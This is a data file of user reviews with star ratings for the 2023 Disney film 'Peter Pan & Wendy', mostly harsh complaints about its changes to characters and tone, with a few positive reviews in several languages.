One of the worse live adaptation to have ever existed. I love Peter Pan and it's previous iterations by other studios but this isn't it. Disney please stop.,0.5
"How can you make a movie about Peter Pan without having Tinker Bell fights with Wendy?! Also, how can Wendy be far more skilled than Peter that lived in Neverland far more than her entire existence?!? Ho..sh.t, this is the same thing they've done with SW marie-sue characters.",0.5
"Weell, it pretty much destroys Peter as a protagonist. Wendy is just a douchebag campare to the ols cartoon.",0.5
Too many changes. The Disney magic is gone!,1
Why does Disney have to ruin my childhood!,0.5
"Just recently canceled Disney+, since Mandalorian was done. However, I decided to watch this. Oh how I wish I did not, it was just a soulless live-action remake yet again. Will not be adding Disney+ back until more Star Wars comes out, and even that is questionable.",0.5
"Enjoyed the nuance in the story between Peter Pan and Captain Hook compared to the original's tired trope of villains being bad for bad sake. However, the main protagonist Peter Pan is primarily sidelined for Wendy who is consistently unlikable in the film. Peter Pan is also deemed more villainous than Captain Hook which made me question who the director of the film wanted fans to root for. Cause it definitely wasn't the protagonist of the film. The magic from the original seemed to intentionally lost for a more dreary, uninteresting land and story that has less magic than even the real world.",2
"Thought it would better than the original live action Hook starring Robin Williams that me and my daughter love so much. However we were both disappointed at the unnecessary changes regarding the lost boys, peter pan, wendy, and captain hook. Basically every character. This movie is a slap to the face to the original and beloved peter pan animated movie.",0.5
Boring and unimaginative,0.5
This movie is a complete waste of time. Absolutely no respect for the source material like everything else Disney does now and clearly a sign that Disney is dying!,0.5
No care goes into these remakes. They're made to keep copyright on certain aspects of the IP. The quality means nothing to them.,1
"Read any similar rating and you'll see why I signed up to rate this movie. My kids were bored, the movie was another Disney rug pull, they even made the girls look bad this time. I thought that was the opposite of their messaging. They don't understand the characters they're putting on screen.",1
Dull and grey. You can tell the writers and directors suffer from depression.,0.5
"half a star is still too high for this train wreck, why not go back to the classics instead of this reboot?",0.5
"I was shocked to see that you guys removed negative reviews. I thought you are better than IMBD who removed Rings of power reviews. Why is it ""okay"" to positively review ""bombing"" something and why its ""bad"" to tell the honest truth about what I feel about a movie, like Peter Pan? I grew up on the 91' hook movie. I watched it at least a 100 times because it was GOOD! This movie was indeed rotten, rotten to the core. Bad acting, bad CGI, bad plot, bad dialogs I just wanted this to end.",1
"boring, poorly acted, visually poor. a tiny and horrendous pseudo movie that completely destroys the idea and magic the original book.",0.5
"Absolutely the worst move I have seen in a long time. Almost no redeeming qualities. Peter is annoying, the lost boys are whiny. What a waste of money and time",0.5
Why did they ruin this classic movie?,0.5
"If you completely ignore the fact that they had to make the girls as dumb as boys in order for there to be lost girls. Which completely eliminates the need for Peter and Tinkerbell to find a real girl. And really playing into the Native American stereotype by turning the princess into a shaman. And making Peter have zero redeeming value for what he did to Hook. And Hook being the only character you feel any sympathy for. Removing Tinkerbell's storyline with her not being jealous of Wendy and betraying them. I guess, Disney could have only made this worse, by leaving this title, as if when you played the show it was actually a film from the 1940s of Inuits in the Arctic Circle clubbing baby seals to death with huge Smiles on their faces. That's about how bad this production is with respect to the Beloved franchise that's come before it.",0.5
Terrible modern reboot no one wanted. I'd rather watch FNT,0.5
"Rather than forcing all the things, just tell a good story. How hard can it be? The audience are clearly telling you this is disliked because it's forced. Stop it! Plus the title should have been Wendy in Neverland.",0.5
half a star is still to high of a rating to give,0.5
"Its a different story, bad casting, lack of charisma‚Ä¶ An expensive Hallmark movie.",2
I don't know where I'm starting first of all Peter Pan And Wendy when something out of animation instead of hook end up eat alive in tick tock crocodile. Also realized we get to find out real name of hook it's part of lost boy names : James! Youch what a shocker.,3.5
Classic Peter Pan is about accepting growing up. but this Peter Pan movie has nothing to do with the main theme of the classic movie. She even slaps Peter Pan. I mean WTF! Worst movie. Don't waste your time.,0.5
Nothing new or interesting. I liked Beauty and the Beast but this was darker and just not entertaining. Disappointment.,1.5
"This destroyed my childhood. Miscasting, cringe dialog. Poorly acted. Who thought it was a good idea to throw money at this pos. Disney better wake up or sell their properties to a studio who will actually make something good with them.",0.5
Leaving a bad review because it's Disney and they turned off the ratings,0.5
No point in another remake,0.5
"Bloody hell. Bloody hell. Bloody hell. That was awful. Peter is awful, impossible to like. Jude Law is the best thing in it. But he's not enough to carry it.",0.5
The first 30 min or soo are extremely boring and cringe and basically unwatchable but if you bare through that first 30 min you'll have something to focus on and the rest is just fine,3
"Gostei da narrativa, mostrou um outro ponto de vista sobre o vil√£o da hist√≥ria. Deveria ser um filme sobre o Capit√£o Gancho e a Wendy, igual j√° teve da Cruella e Malevola. A terra do nunca sem magia e com muito filtro verde. Com tudo, depois do Peter Pan de 2003, esse novo √© o segundo melhor, recomendo",5
"There was no storyline, the makers seemed too busy to cater to every single minority to concentrate on the actual story",1
A nice revisit to neverland. I enjoyed the movie and thought it was really cool. The songs and adventure scenes really encapsulates the Disney vibe.,5
Yes it's that bad. Disney really enjoys shooting itself in the foot it would seem.,0.5
Haha. Content sub-par. Why make yet another re-make of this???,0.5
"I loved did. I think that some people writing reviews here seem to have forgotten that the ""source material"" for this movie ( and animated movie too) started with a *book*. Not Disney. I love how there were more things incorporated in this movie that weren't part of the animated one... they were from the book. Of course the backstory with Hook changed, but okay. I'm really pleased with the actors and how everything wasn't overly Disney-ized. Thank you!!!",5
lacked pretty much everything you would expect from a peter pan movie so sad on the eyes,1.5
And again a bad remake. Terrible! Disney stop doing this crab!,0.5
"I really loved it! The animated Peter Pan was one of my favorite movies growing up, and this new movie was a delightful return to Neverland. The cast was great, the music was lovely, and the whole movie was enjoyable and filled with heart. The Hook and Schmee dynamic is still incredible. I really loved this movie!",4.5
"This Peter Pan adaptation has a lot on its mind and, and this is both a good and bad thing. It's good in that it justifies the presence of the adaptation and makes it more interesting for the adults. But it's a bad thing because it prevents the film from having a sense of fun, which holds the audience at arm's length.",3.5
Just wasted 2 hours‚Ä¶ don't make my mistake,0.5
"No puedo creer la mala adaptaci√≥n de la obra original, quitaron el brillo de Campanita, volvieron guerrera a Wendy y ahora resulta que no es la primera ni√±a en Nunca Jam√°s. Ya basta de Disney y sus Live Actions sacados de Netflix.",1
Another failed remake. Are these people somehow insulated from consequences? How are all these shows/movies coming out that everyone hates and these people get rehired?,0.5
"the kids were bored and they love the animated version. slow to start, very ""safe"" 2023 version. No alligator bite. wouldn't watch it again.",0.5
"Jude Law does ok. The only good part of this movie. They changed the lore to make Wendy a girl boss. Don't watch this. Pick up the original, its infinitely better.",0.5
"Did someone in Hollywood set out to absolutely ruin everything worthwhile? Every other live action remake is worse than the last. The old fairy tales carried the charm of childishness, innocence, while remaining open and accessible to all ages. I couldn't say more nice things about this monstrosity masquerading as a work of art than about the stinking remains of a cat's nocturnal visit to our backyard.",0.5
Slow paced at times and too fas at others. Takes the best of the original animation and cant make anything good with it. The story is bland and the overall cinematography is Just OK.,0.5
People are tired of this bullshit. Why does Hollywood keep doing this?,0.5
"So I'm going to note that I actually did (generally) enjoy this. However, I feel like it's not really Peter Pan. It's definitely a darker rendition of the movie, which isn't necessarily bad, but they didn't know how to balance it with the elements of wonder and magic. Wendy is definitely the central character and Peter is kind of an unlikable side character. None of their characters were particularly fleshed out and the movie was boring at parts. Overall, I feel like it watchable, but it lacks the wonder and whimsy of Peter Pan. Captain Hook also isn't *really* a villain in this movie so much as a misunderstood sad man.",2.5
I stopped watching after 20 min i think. It was so bad i couldnt even fall asleep when watching this,0.5
How can I give zero ratings? because half of star it's too much for this,0.5
This movie was awful.,0.5
"It was hard to watch. Wendy is reduced to someone 1 dimensional, everything else is just ship wreck. Disney is no longer writing stories, they're just trying to lecture us with shitty lessons.",0.5
"Extremely boring film with little conflict or cadence. Peter's character was lifeless and dull, and the actor was one dimensional. Movie was forced around Mary Sue characters like Wendy and Tiger Lily. Visually a bore. Nothing magical or special about neverland from a set design stand point.. Jude Law was good, but his writing was awful and made Hook difficult to hate as a villain. I was actually excited to watch it, but instantly felt bored and disappointed.",0.5
"No estuvo tan mal como lo esperaba y sin embargo no era lo que todos quer√≠amos, es una adaptaci√≥n triste de un gran cl√°sico‚Ä¶ La interpretaci√≥n de Alexander Molony como Peter es aburrida y poco inspiradora; de hecho, todos los dem√°s personajes son as√≠ a excepci√≥n de Jude Luwe como Garfio. Me quedo con el live action de Peter Pan (2003) que pasaban en Disney Chanel ü•π",2
"Words cannot describe how utterly horrible this movie is. They would have been better off creating a new movie unrelated to Pan with a different title and characters, because ultimately that's what they did. It's nothing like the original. It's a slap in the face.",0.5
"There were only a few scenes that aligned with the original movie. The best way to describe this, is just boring. Extremely boring. Half the time i forgot it was supposed to be Peter Pan. They changed a lot from the original and didn't really go anywhere. I was falling asleep sitting up trying to watch it. Just a waste of time.",0.5
"No comprendo el cambio de los personajes. Innecesaria, f√∫til y aburrida",0.5
S√≥lo espero que DISNEY ya no est√©n inclusivos,0.5
"Horrible story! This is not Peter Pan, it is another story with the same name.",0.5
"As a long time fan of anything related to the Neverland mythos, this immediately became my favorite Peter Pan related film. Not the film most people were expecting (as its less of a direct adaptation of the original Peter Pan, and more a parallel story that builds on the same themes) and likely not the type of film many people were hoping for. But it is, without a doubt, a well crafted film full of beautiful scenery, an emotional character driven story, and great acting performances by the majority of the main cast.",5
"Fiquei muito empolgado com esse an√∫ncio, pois vivia assistindo o filme de 2003 (Peter Pan) quando eu tinha por volta de 3 √† 5 anos, e considero esse filme a melhor obra do Peter Pan, diferente desse de 2023. A coisa que mais me incomodou foi o pr√≥prio Peter, que aparece bem menos comparado com o Live Action de 2003, e o nome do filme √© ""Peter Pan & Wendy"", mais uma vez, ""PETER PAN & Wendy, ent√£o cad√™ ele? O CGI funciona, por√©m, j√° que esse filme foi lan√ßado em Streaming, o or√ßamento √© bem inferior a outras obras da Disney, assim, os efeitos especiais incomodam um pouco durante o longa metragem. Al√©m disso, as atua√ß√µes s√£o bem prec√°rias (Da maioria dos personagens) e os √∫nicos que se salvam √© a pr√≥pria Wendy, Capit√£o Gancho e Senhor Smee, que possuem um desenvolvimento bem interessante, s√≥ que poderia ter sido melhor explorado, e infelizmente, nenhum personagem tem carisma, nem esses que eu comentei. A hist√≥ria √© MUITO simples e clich√™, j√° o filme de 2003 tem alguns elementos que, mesmo sendo simples tamb√©m, tem uma √≥tima dire√ß√£o e contexto, como o romance de Peter e Wendy, que √© bem constru√≠do, j√° no de 2023, √© quase imposs√≠vel notar o amor entre eles. E, claro n√©, esse filme de 2003 √© antigo e tem cenas que envelheceram um pouco mal, mas √© inacredit√°vel como ele pode ser incrivelmente melhor que esse novo em todos os aspectos. Ent√£o, essa tentativa de adaptar o Live Action de Peter Pan (Mais uma vez) decepcionou muitos f√£s, inclusive eu (N√£o que eu seja um grande f√£, mas esse universo me traz nostalgia). S√≥ pra constar, a melhor coisa do filme inteiro √© o Capit√£o Gancho, por√©m ele faz parte de um amontoado de coisas ruins, ent√£o a nota n√£o ter√° muita influ√™ncia desse personagem. Conclus√£o, Peter Pan & Wendy recebe uma nota 3,0 (Talvez 2,5).",1.5
"Once again Disney have taken an iconic movie from the past and butchered it to try and ""fit in"" with the times",1
Jude Law is the only interesting part of this. Disappointed in the director here,2
"Oh wow...more Mary Sue Girlboss stuff from Disney (what a huge surprise <sarc>). Completely butchered the original story to check boxes. Remember when movies, animation, and cinema used to be just fun? Oh yeah...Mario and Minions remember. Disney is lost...",0.5
Mais uma bomba / porcaria da Nova Disney. One more stinky movie from the New Disney.,0.5
Waste of time movie.,1
"Neverland used to be a magical place filled with dreams and happiness. In this movie Neverland is dark, boring and not special in any way.",0.5
"The best thing about this movie is that it's called Peter and Wendy instead of Peter Pan. Which I appreciated because it is a retelling of the story, and trying to make it realistic. The 2003 Peter Pan is much more of a 'live remake'. My biggest issue is Peter Pan himself, I did not like Alexander Molony's interpretation of Peter Pan at all. It was very dull, uninspiring, and boring. I only remember him half smiling once, and the rest of the time he simply just talks with the same expression on his face. Peter Pan being so low energy really made the whole experience seem much more sluggish then it needed to be. It also didn't help that Tinker Bell was non-existent throughout the film as well. You see her multiple times but there was no emotional range with her either. Just a smile and some pixie dust sharing. To me Tinker Bell could have been replaced by just a bag of pixie dust and that would have had the same presence in the movie. These two factors were a big issue for me because Peter and Tink are such a great duo, filled with emotions and energy, while this movie seemed to just completely dilute those characters. Tiger Lily is the best character in this movie. She was really cool and inspiring. And I also really enjoyed her fight sequences. I'm not sure how they got Peter Pans character and fight sequences so bad when Tiger Lily's were so good. The one other movie moment that was enjoyable was when Smee said to wait for the splash, that was funny. My final point is with captian hook, on a personal note his lack of hat truly upset me deeply. I mean even if you're doing a more realistic take on the story. Give the man a hat with some volume! But the real issue isn't with hook himself, but rather this trend of presenting the story in a way that shines positive light on the villian and try to justify him being a villian. Sometimes the bad guy is just a bad guy, and not some would have been good guy if not for some terrible tragic past that forced him into being a bad guy. Overall I have no desire to watch this movie again, I'd be down to watch a Tiger Lily spin off movie. But other than that the movie was really dull.",2
This just wasn't Peter Pan to me as it was darker which I liked but it still was wrinkly casted(no offense to Jim gaffigan) and just pretty boring this movie is just a bore,2
"A meanspirited parody of Peter Pan and especially Wendy, who they totally misunderstand and utterly ruin. Don't let these talentless people write another movie, please.",1
I honestly loved this interpretation of Peter Pan. It perfectly combined the book with the old movie and transported both into current days. I especially liked the whole storyline around Peters and James' friendship and the fact that Wendy was an as equally centered character as Peter. I just wished this movie was a little longer and I would have liked to see it in a movie theatre.,5
It's simply the worst Disney's movie,1
"Wow, whaddya know, the mad hunt for ""realism"" that's been killing animation for about a decade has sucked the life, color and magic from a Disney classic. Again. Just like every other live action remake. At this point the execs reallyyy should learn their lesson and just let artists make something original",0.5
"As a young boy I saw the original Peter Pan.. and have enjoyed the original animation with my kids. I was invited to see this with friends, and thank God they paid for the ticket. This was just a horrible rendition of a classic as to make you cringe. Wendy is just a Mary Sue now, and tinker bell has no character arc.. and Peter? What happened to him? A soulless sot. It is just a bad movie.",0.5
"Una versi√≥n con toques diferentes a las anteriores de esta misma productora, se da una historia de transfondo a Garfio, y tiene buenos mensajes para el p√∫blico infantil (y quiz√° adulto). La diversidad es muy buena, y te hace pensar que los ni√±os perdidos llegaron de diferentes partes del mundo a un pa√≠s donde jam√°s crecer√°n. Lo que no me gust√≥ fue la pobresa en las locaciones, y el no aprovechar la magia de ese lugar. Respecto a los actores, mi favorita es la que hace de Campanita y el peque√±o hermano con su osito. Wendy no esa mal, pero a Peter le falta carisma (m√°s para una pel√≠cula en la que el es el protagonista y hace de un ni√±o travieso).",3.5
How can something be so bad? What a waste of time!!! And tinker bell??? C'mon!,0.5
Very slow movie without rhythm,0.5
"A dark cold retelling of the same story. No fun or energy. No imagination. Just more DEI stuff and a money grab. I don't blame the actors and it seems like they did a good job with what the directors wanted, which isn't in the spirit of the franchise.",0.5
"The only thing worst than the casting, was the acting. Terrible movie. Only Captain Hook is worth even mentioning",0.5
La adoraci√≥n no muy buena,0.5
"Visually looks good, a bit slow.",3
a shitty misrepresentation of the fairy tale that has enchanted so many generations.,0.5
"My family and I really enjoyed it. Entertaining pirates, some good life lessons and commentary on the central premise of Peter Pan: not growing up.",5
Boring üò¥ family started watching Peter pan and Wendy. Twenty minutes in was enough.,0.5
"How can you, as director, remake a movie that you absolutely hate?",0.5
"Really boring, forced scenes all over the movie. If want to see a cast who's less skilled than a peanut butter sandwich and get a nap, well you got the perfect choice.",0.5
"Ning√∫n personaje te atrapa, no tienen esas caracter√≠sticas que cada uno tiene que te hace conectar con ellos, las nuevas adaptaciones no tienen ning√∫n sentido.",0.5
Another money grab adaption that failed to capture any sense of the original animation. Almost impossible to sit through the entirety with the family.,1
"Peter pan is supposed to be a story of childlike innocence and imagination vs the value of growing up. They threw out both and made it a gray mess. Wendy was looking forward to adulthood, and lead the lost boys into becoming adults. The book, animated films and stage productions helped children enjoy childhood and look forward to adulthood, while reminding adults of the value of imagination and play. This movie does neither, it looks down on both imagination and adulthood.",0.5
Boring and gloomy. No characters are developed. Was interested in seeing a new adaptation on a classic and disappointed in the script and visuals.,1
"P√©ssimo, triste adapta√ß√£o de um cl√°ssico",0.5
"As a Peter Pan fan this movie just doesn't hit the mark the original Disney movie did, or the 2003 Peter Pan movie. The costumes were dull, Neverland itself was very lackluster too. A huge disappointment.",2
Excellent! Great retelling with a true vision behind.,5
"Good, Pan too serious tho.",4
"There was no wonder or magical excitement. Peter is mainly emotional and broody. In the first scene with Peter and Hook it was great for quite sometime making me think of the original Peter of the books. However, when confronted with real challenge Peter becomes weak and moopy. Wendy is kind of insufferable. She is whiney and when she isn't whining she is being bossy. Nothing like the Wendy I grew up with or the Wendy of the books. This take on Peter Pan and Wendy was a bit more like the book in some ways but in other ways it was not. This adaptation was as similar to the books as the 1950s Disney movie except this one was darker and not as magical feeling and I think they could have done better.",1
Peter Pan portrayed as a wimp and Wendy as a girl boss was a huge turnoff. Disney feels obliged as always to wokify the original characters. What a shame!,0.5
"Too long for children, unraveled (confusing) story, and sometimes boring.",1
"Un asco total, espero muchos despidos despu√©s de todo esto.",1
After the terrible 'Pan' (2015) this was a delightful relief. The difference really HITS when you can clearly see that the directors decided to honor the books and the memory of J.M.Barrie. A real fan service! I absolutely loved it ‚ù§,5
Nothing good to say‚Ä¶ the colors were drab and the overall feel was gloomy. Peter pan has been reimagined many times already and this has to be the worst.,0.5
"I guess I was expecting it to follow the original storyline but far from it. Peter is supposed to be a take charge, rambunctious, self assured young boy but in this take of Peter Pan he's a weak, mumbling, shell of a character that couldn't lead a group to save his life. Literally. Very sad. Dissatisfied and disappointed.",1
Great family movie and loved the updated and more current messages for kids.,4
"One of the worst movie I have ever seen. I couldn't finish it. Even the kids got bored that tells a lot. Acting was bad, story was empty, the casting is mediocre. It is another useless wokefest by Disney. They are really losing it.",0.5
"Boring script, bad acting, Wendy looks way too old.",0.5
"Screw nostalgia! This was an entertaining movie! I admit, I was skeptical. I hadn't heard amazing things about the movie from most viewers. I also (admittingly) wasn't too impressed with many of Disney's live-action adaptations. And I didn't hold the original Peter Pan in high regard as it wasn't a film close to my heart. Perhaps that was a reason why I could enjoy the film without comparing it to the original. When I did that, I found the cast charming, the story actually much better than the original, and the little details I could find charming. For the record, Tiger Lily *needed* an update. Tinker Bell *needed* an update. Wendy most definitely *needed* an update. And the film does it charmingly without being obnoxious. I enjoyed all of the Lost Boys (and Girls) and every child and adult actor. And Alexander Moloney made a delightful. The only flaw is that the story would have been better served as a series to explore the reimagined world in more detail. With the looks of the review, I do not think that will happen. I mourn that the cast may never get a chance to explore this tale. They are talented and deserve more than to be quickly written off. And while the time allotted to it prevents it from being a true masterpiece, it was entertaining nonetheless. So again I say this: screw nostalgia. As the film so clearly illustrates, sometimes holding onto the past keeps us from enjoying the present and looking toward the future.",4.5
The character Peter is wrong and the caps took James hook wrong. Who ever thought this movie was good it's not. I'm not saying nothing will ever touch robin williams Peter Pan but this isn't the stuff,0.5
"It was great fun, I enjoyed it. It wasn't the Peter Pan I know, more of a parallel universe version of Peter Pan. But even the Disney Peter Pan that I grew up with isn't like the original.",5
"I feel like the dialogue of this movie was written in one night with no revisions or reviews. I barely got through this movie. While visually beautiful, it takes all the magic out of the story. Acting is fine but not good enough to save a bad script.",1
Horrible y aburrida zzzzzzzzz,0.5
Bland and boring. Really hoped Disney had their magic touch back.,1.5
"This is God Awful, the guy who did Peter Pan is terrible in this film + he is barely in the film, Worse than the Pinocchio remake, at least the Pinocchio movie tried, and here it's not trying, totally not recommend it, boring, stupid and so painful to watch, I'm giving this a -10/10 I hated it even more than the Pinocchio remake ü§¨üî•",0.5
Extremly painful to watch. Don't waste your time and money. What the original instead.,0.5
Terrible and a waste of time,0.5
"""Peter Pan and Wendy"" is a disappointing film that fails to capture the magic and wonder of J.M. Barrie's beloved story. While the original tale has enchanted generations with its timeless themes of imagination, youth, and adventure, this adaptation takes far too many liberties with the source material. First and foremost, the film's portrayal of Peter Pan himself is a far cry from the mischievous, impish boy who captured readers' hearts in the original story. Here, Peter is portrayed as a moody, brooding teenager, complete with angsty monologues and a self-serious demeanor that is completely at odds with his character in the book. Moreover, the film's attempts to modernize the story with needless updates and changes only serve to detract from the whimsical, fantastical nature of the original tale. Characters like Tinker Bell and the Lost Boys are given updated, modernized designs that feel out of place in the story's timeless setting, while unnecessary plot points and contrived conflicts are introduced in an attempt to make the story feel more ""relevant"" to modern audiences. Worst of all, however, is the film's mishandling of the story's central conflict between childhood and adulthood. Whereas the original story delicately explores the tension between the two worlds and the bittersweet nature of growing up, this adaptation approaches the theme with all the subtlety of a sledgehammer. Characters openly pontificate on the nature of growing up and childhood, and the film's ending feels heavy-handed and unsatisfying. In the end, ""Peter Pan and Wendy"" is a shallow, misguided adaptation that fails to capture the spirit of the original tale. By altering and modernizing the story's themes and characters, the film loses the magic and wonder that made the original so enduring. Fans of the original book would be wise to steer clear of this misguided adaptation.",0.5
"It is very far from the original story, they should better make another story and change the title of the movie.",0.5
"Lacking in magic, the story spends longer than normal on the Hook backstory, but then jumps around in other parts of the story, leaving no time to build up any affection for Peter Pan at all, and leaving you bored, and empty by the end.",2
"I couldn't watch past the first 15 minutes of the movie. The writing was horrible, Wendy instead of being a mother figure was weirdly sassy and annoying, her parents wanted to keep her which kinda ruins the entire motivation of the story, and the jokes were so cringey I couldn't keep watching this horrible rendition. Disrespects the source material in every sense of the word.",0.5
Horroroso. Ainda n√£o entendi essa necessidade da Disney querer ir √† fal√™ncia t√£o r√°pido!,0.5
All the great things about Peter Pan were thrown out; all the current societal controversial archetypes were unabashedly included; Stories were retconned to the determent of historical perspective and the story.,0.5
It was so bad it made my eyes and ears bleed,1
"This was horribly bad. The actors playing Wendy are way over the top and remind me of Nicolas Cage in Face-Off. Except that movie has some kind of entertainment for that kind of acting. Her facial expressions are so funny and I can't tell if she is mad or needs to go to the toilet Also, the boy playing Peter Pan seems to have been forced fed with Prozac and doesn't want to fight or even take part in the movie And don't get me started on Tinkerbell. She is supposed to be an aggressive fairy that doesn't like Wendy one bit. In this, she is just agreeable and boring Did the numbnuts who made this trash watch he original movie? After watching Disney rape another of my childhood favorites. I don't even want to know what horror they are going to bestow upon us with the upcoming movie The Little Mermaid. God, please have mercy on our souls and protect us from Disney's Armageddon",0.5

Disney really need's to stop about this live action things,0.5
"Ok, maybe I'm too old and too fond of Hook and Peter Pan, but my nephew isn't, and he wanted out after about 20 minutes.",0.5
It's nothing wrong with making a safe movie for kids but this was just a plain snore fest. The editing ruined a lot for me and Jude is trying his absolute best and somewhat saves the movie but there's no fun between the characters. Found myself more invested checking my mails and having the film on in the background. Won't see again.,2
"Peter Pan & Wendy grows out of its predecessor by eliminating its weaknesses and building upon both its strengthes and the literary model itself. To do so, Lowery alludes to iconic elements like the Crocodile that once ate Captain Hook's hand while he also leaves out the racist steryotypes that defined the Neverland Natives in the animated feature. This is combined with own adaptions of the original Pan story lines as well as a sense for giving it a more modern touch: the lost boys are rather lost children and thus appear more natural. Also, the leading roles were well cast. Jude Law presents a whole new and yet known Hook, while Shahidi's Tinkerbell is more approachable than her animated predecessor. The film might not live up to the best Disney features and remakes even though it's hard to determine major weaknesses. However, it offers much entertainment, especially for fans who have not only seen Peter Pan films, but also read some book adaptions and are thus able to say it fits into the entire canon.",4.5
"Disney doesn't care about what the people wants. They're all for the cash grabs because they are greedy. Now this one is another example of why Disney needs to stop making live action remakes. It lacks magic, they swap the characters just to annoy their fans, possibly also to promote feminism among others, and also changed the entire plot of the entire movie. Disney needs to get back and rewatch the classics more accurately and have a serious dedication to the remakes. I swear Cinderella remake was better than this.",0.5
"Thankfully we learn something new about our main rivals, and some cool short lived visuals. Otherwize unless your a big Jude Law fan, you may want to skip out on this trip to neverland.",2
"So Saturday 6th of may I decided to put this on for the kids and they said they didn't like it and it was boring, they then put hook on and Peter Pan 2003 on.they said Wendy was horrible in the beginning to her brothers and tink didn't glow of had an attitude. I thought Jude law was ok at hook but nothing compared to Dustin Hoffman from hook and Jason Isaacs in Peter Pan 2003 and even hook from once upon a time.the whole movie had a horrible yellow tone, I don't understand the girls in it.Disney's remakes are hit and miss and this is definitely a missed opportunity with Dove Carman, I don't understand why they didn't cast this new tink as IRRADESSA & included the other fairy's Absolutely disappointing movie",0.5
Es el mejor ejemplo de como arruinar un cl√°sico infantil. Desconozco cual ser√° la obsesi√≥n de Disney por readaptar en vez de crear.,1
"Why can't Disney leave a good story with its heart? Instead, they have to try and flip characters into something even opposite the original. This is the second worst retelling of Peter Pan that I have seen. No depth, no true development, and with Disney trying to be ""socially"" acceptable, has made yet another modern era disaster.",1
I think the ego of the producers are much higher than their productions!,1
This movie is the worst version ever made about Peter Pan.,0.5
"Absolutely ruined a great story. Worst Peter Pan movie by far. There was some cool cinematography, but terrible acting. The casting was terrible. They changed the whole story just to try to appeal to modern audiences. Disney sure knows how to ruin a good thing.",0.5
The changes done to this movie were inexplicable. Characters are hollow shells of the original story. Wendy is the greatest being that ever set foot in a Neverland.,1

"Oof indeed, the soul of what made Disney movies great to begin with seem to be completely gone with current management and movie direction. No inspiration and checking boxes that 99% of America no cares about because it's totally forced on these timeless stories that were perfect to begin with. Totally out of touch.",0.5

"Mischaracterizing characters, weak performances. This is never going to be the world of Peter Pan.",1
"This movie was a huge disappointment, I myself am a big fan of Peter pan, the originals and the live actions. The attempt to make Wendy the main character and having her almost switch scenes with Peter was just stupid, the push of a girl being as strong as the boy and doing what they can is used completely wrong in this context as it completely strays from the original material of pan fighting hook. I am glad the audience rating is so low and if I coukd give it less than one star I would, even minus stars if possible. Casting was so wrong, stale performances from the children and a hook that had no characteristics of his true character. The only reason this film was finishable for me was because of the story that pan and James were once friends which pays tribute to a twisted pan story I care much about. Apart from that the movie was abismal and I will never rewatch or recommend to someone.",1
Wish I could rate it lower,0.5
"Es una p√©sima adaptaci√≥n de la obra cl√°sica que no comprende el verdadero mensaje del autor, el cual se pierde por el af√°n de los directores de poner su propio mensaje.

"I am the #1 Curly Fan, Curly is the absolute best part about this film and it could not have ever been good without her. Every line she has is delivered in such a perfect manner that I really feel the words coming inside of me. Her soprano voice is so captivating that I couldn't help but make audible fan girl noises as she spoke. Her acting is truly top of the industry and carries the ENTIRE movie. Florence Bensberg is truly the best actor of this century and I hope she is successful in the industry for years to come. Did you know? - Florence Bensberg's net worth is $1 million US dollars - Florence Bensberg's eye colour is broun. - Florence Bensberg is currently studying in school and is yet to complete his schooling to join college - We currently have no Information about Florence Bensberg and Father. We will soon. Overall this movie would not be the same without Florence Bensberg's amazing performance as the character ""Curly""",5
"Bad acting, Jude Law flops as captain Hook, not even nice songs or effects. Really a disappointment",1
Very slow and missed opportunity. They could have done so much more with Neverland and the characters. For such a long movie they never give you real depth to characters. Any relationship development or a real climactic scene. It's just all one big blend of people jumping around. They had a good idea for the peter and hook story line but it's just not developed enough either. The cartoons a shorter film and packs in more magic.,1
"I hate the Disney remakes! I don't think there is a single good one! True, some aren't as bad as others, but I have yet to see one that captures the magic of the original and/or out does it. Peter Pan & Wendy is not one of those exceptions! True, they try to mix it up by adding some backstory to Peter and Hook's relationship, but that's really the only thing they add. There's no chemistry between the cast, the characters are bland, the effects are awful, the musical moments are stale, and it just feels phony. The movie manages to ditch all of the charm and wonder of the original 53 film and makes the story feel like it just came straight off of a conveyor belt. And the worst part is, I'm probably going to be repeating myself when The Little Mermaid is released.",0.5
"Bad adaptation, without salt, without soul, an old repeated story of Disney trying to end its own films.",0.5
"Disney is eating itself; taking old, popular titles and remaking them badly. This is not a new phenomenon, of course; I think the WGA needs to stop worrying about 'artificial intelligence' and start worrying about 'natural stupidity.' This, for instance, reeks. There is no joy, here, no lessons of love; it's all hate. And the makers, I'm sure, high-fived all around and their bosses gave them raises. That is, they *meant* it to be this bad. Natural stupidity.",1
Zero stars. Knock it off Disney. This just plain sucked.,0.5
P√©ssimo e de mau gosto!!!!,0.5
"The casting and acting is poor, they distract from the story and imagination as it feels very forced and fake/not believable which make it an unenjoyable and distracting watch. Jude Law is as unconvincing as ever.",1
"Boring. You can definitely tell it was largely agenda driven. I'm ok with rewrites and new angles for retelling old movies, but this ain't it. Peter was non-existent in this movie. Would have been ok if they just called it Wendy. Not much character building, cast was mostly just there to be there.",0.5

"Some bright moments, Jude Law as always was great. Having said that, another live action adaption from Disney that just misses the mark and lacks the magic that the original brought.",1.5
"Peter Pan & Wendy is such an amazing movie. The script is based on the animation movie Peter Pan released on 1953. But the director has bring more new scenes and the Neverland were shot at Faroe Island is so beautiful. The cast is so passion with their role. Especially the young actress Ever Gabo Anderson who played Wendy makes me remember the character Susan in The Chronicles of Narnia. The CGI and VFX are so fantastic and professional to making the scenes so real especially is the captain Hook's ship. However there are some points that make me feel little disappointed. The captain Hook doesn't look like in the 1953 version and Tinkle Bell too. But if you ignore all that problem. If you have stress and want to relax, I would highly recommend this is the movie you must watch",5
Once again Disney is destroying a great history in a terrible live action,0.5
"they took everything that made peter pan good, and f*ed it up.",0.5
"I'm not even surprised at the lack of good story telling coming from Disney anymore. This movie is full of bland characters, terrible values, and bad lessons. It completely misses the mark in every way. It does nothing to improve or update the story, whatsoever. In fact, it shreds all of the nuanced story and messages of the original and replaces it with bad character development and horrible story telling. Two thumbs way down. This atrocity should have never been made. I feel bad for the cast and crew that were subjected to making it and for all of the other poor viewers, like myself, that wasted 2 hours of thier lives.",0.5
Astonishing nonsense. Avoid,0.5
"I wanted to turn it off so many times but i trudged through it to ensure formulating a valid opinion. Another example of an ill-conceived, re-imagined, reinterpretation of classic source material. The obsession with changing core concepts, under the delusion of ""updating"", i.e. Marketing to a dullard section of society that is easily and readily influenced by whatever is currently trending, will appeal to some individuals. However, this forgettable effort will NEVER rank with the classics. In a word...OBNOXIOUS. I'm just glad there are a number of existing quality adaptations of the story so that this is not the only example. Terrible low point for Disney...",0.5

Removes the original story of Peter Pan of the animated movie which I think Is why it's bad,0.5

